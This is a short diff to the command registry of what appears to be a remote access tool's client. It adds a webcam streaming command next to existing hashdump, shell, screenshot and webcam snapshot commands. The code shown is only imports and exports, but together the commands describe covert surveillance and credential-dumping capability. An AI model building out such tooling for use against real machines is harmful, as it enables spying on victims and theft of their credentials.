@@ -6,6 +6,7 @@ from client.commands.screenshot import ScreenshotCommand
 from client.commands.search import SearchCommand
 from client.commands.shell import ShellCommand
 from client.commands.webcam import WebcamSnapshotCommand
+from client.commands.webcam_stream import WebcamStreamCommand
 
 __all__ = [
     "HashdumpCommand",
@@ -16,4 +17,5 @@ __all__ = [
     "SearchCommand",
     "ShellCommand",
     "WebcamSnapshotCommand",
+    "WebcamStreamCommand",
 ]
